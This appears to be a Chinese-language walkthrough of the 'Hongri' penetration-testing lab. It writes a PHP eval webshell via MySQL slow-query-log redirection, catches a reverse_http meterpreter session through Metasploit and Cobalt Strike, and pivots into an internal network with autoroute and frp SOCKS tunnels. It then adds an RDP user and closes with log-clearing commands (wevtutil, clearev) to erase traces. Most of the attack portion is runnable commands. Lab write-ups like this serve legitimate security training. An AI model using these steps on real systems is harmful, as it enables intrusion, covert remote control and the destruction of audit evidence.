![](../image/渗透-红日靶场-6.png)

发现secure_file_priv` 为 `NULL，必须是为''才能写入文件

所以不用用 `into outfile` 的方式写入木马了

这里要通过日志文件写入木马，和PHP里利用UA头日志文件写入木马差不多

首先开启日志文件的功能

日志读写默认是关闭的，所以要我们打开

```
set global slow_query_log=1;
```

然后修改`slow_query_log_file`日志文件的绝对路径和文件名，之前的php探针里泄露了绝对路径

```
set global slow_query_log_file='C:/phpStudy/WWW/shell.php'
```

然后查看一下修改是否成功

```
show variables like '%slow%';
```

![](../image/渗透-红日靶场-7.png)

可以看到修改成功了

然后就是向日志文件中写入shell

这里后面必须接个命令才能写入

```
SELECT '<?php @eval($_POST[1]);?>' OR sleep(10) 
```

![](../image/渗透-红日靶场-8.png)

## msf接管主机

联动msf继续进行渗透，在kali中启动msf

```
msfconsole
```

然后使用handler模块开启监听

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set lhost 192.168.52.128  // 对应 kali CS 的机子 ip
msf6 exploit(multi/handler) > set lport 8888
msf6 exploit(multi/handler) > run
```

![](../image/渗透-红日靶场-25.png)

开启完监听后，回到cs，选择Spawn	

然后设置 Payload 为 `Foreign HTTP`，监听ip为 `kali` IP，端口为8888 端口

![](../image/渗透-红日靶场-26.png)

监听到之后执行shell命令，此时已经接管主机

![](../image/渗透-红日靶场-27.png)

先退回到meterpreter，然后查看补丁信息

```
run post/windows/gather/enum_patches
```

![](../image/渗透-红日靶场-28.png)

然后查看电脑上安装的软件

```
run post/windows/gather/enum_applications
```

![](../image/渗透-红日靶场-29.png)

可以看到存在nmap，并且已知这里存在内网，所以添加新路由

添加路由之后所有去往 `192.168.52.0/24` 的流量，不会走 Kali 本地网卡，全部封装进 Meterpreter 加密隧道，发给跳板 Win7，由 Win7 的内网网卡代为转发

```
run autoroute -s 192.168.52.0/24
run autoroute -p
```

![](../image/渗透-红日靶场-30.png)

接下来去设置代理，这里使用 `frp` 进行内网穿透，首先在 kali 中执行命令

```
./frps -c frps.ini
```

frps.ini

```
[common]
bind_addr = 0.0.0.0
bind_port = 7000
```

接下来将 `frpc.exe` 和 `frpc.ini` 通过蚁剑上传到 win7，这里要上传 winamd64的 ，修改 `frpc.ini` 内容如下

```
[common]
server_addr = 192.168.52.128
server_port = 7000

[plugin_socks]
type = tcp 
remote_port = 7777 
plugin = socks5
```

然后执行`frpc`

```
frpc.exe -c frpc.ini
```

![](../image/渗透-红日靶场-31.png)



可以发现代理已设置成功，直接对内网机器进行攻击即可，扫描机器存活端口，这里要先退出 session1 会话，在 msf 下执行这些命令。

```
use auxiliary/scanner/portscan/tcp

set threads 100
run
```

扫描到存在`135、445`端口，说明存在`SMB`服务

以下三种方法进行远程桌面登录

**方法一：通过 CS 的 SOCKS 代理 + Proxifier（推荐）**

1. 在 WEB 机 Beacon 上启动 SOCKS 代理（`Pivoting` → `SOCKS Server`）。
2. 在攻击机上用 **Proxifier** 把 `mstsc.exe` 的流量代理到 `127.0.0.1:1080`。
3. 然后直接 RDP 连 `10.10.10.10` 或 `10.10.10.201`，流量会通过 WEB 机转发。

**方法二：端口转发（portfwd）**

在 WEB 机 Beacon 里执行：

```
portfwd add -l 3389 -p 3389 -r 10.10.10.10
```

这会把攻击机本地的 `3389` 转发到 DC 的 `3389`。然后 RDP 连 `127.0.0.1:3389` 就能到 DC。

**方法三：先 RDP 到 WEB 机，再从 WEB 机 RDP 到内网**

1. 攻击机直接 RDP 连 WEB 机（`192.168.111.80`），这个能通。
2. 登录 WEB 机后，在 WEB 机内部再打开 RDP，连 `10.10.10.10` 或 `10.10.10.201`。

这是最简单的方式，因为 WEB 机本身就在两个网段里，它能直接访问内网。

**注意：要先把用户添加加入远程桌面用户组才能远程连接**

**例如mssql用户：**

```
shell net localgroup "Remote Desktop Users" mssql /add
```

# 痕迹清理

主要清理weblogic的日志， 用户等创建可以使用隐藏方式创建，痕迹清理也就是原路返回，看看你都做了什么操作。

　　1.有远程桌面权限时手动删除日志：

　　开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志

　　2.wevtutil：

　　wevtutil el 列出系统中所有日志名称

　　wevtutil cl system 清理系统日志

　　wevtutil cl application 清理应用程序日志

　　wevtutil cl security 清理安全日志

　　3.meterperter自带清除日志功能：

　　clearev 清除**windows**中的应用程序日志、系统日志、安全日志

　　4.清除recent：

　　在文件资源管理器中点击“查看”->“选项”->在常规->隐私中点击”清除”按钮或直接打开C:\Users\Administrator\Recent并删除所有内容或在命令行中输入del /f /s /q “%userprofile%\Recent *.*
